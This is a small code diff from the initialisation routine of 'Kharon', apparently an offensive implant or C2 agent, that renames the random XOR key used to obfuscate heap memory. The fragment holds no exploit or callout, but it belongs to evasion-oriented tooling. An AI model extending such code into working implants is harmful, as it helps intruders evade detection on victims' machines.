@@ -154,8 +154,8 @@ auto DECLFN Kharon::Init(
 
     /* ========= [ key generation to xor heap ] ========= */
 
-    for ( INT i = 0; i < sizeof( this->Hp->Key ); i++ ) {
-        this->Hp->Key[i] = (BYTE)Rnd32();
+    for ( INT i = 0; i < sizeof( this->Crp->XorKey ); i++ ) {
+        this->Crp->XorKey[i] = (BYTE)Rnd32();
     }
 
     /* ========= [ informations collection ] ========= */
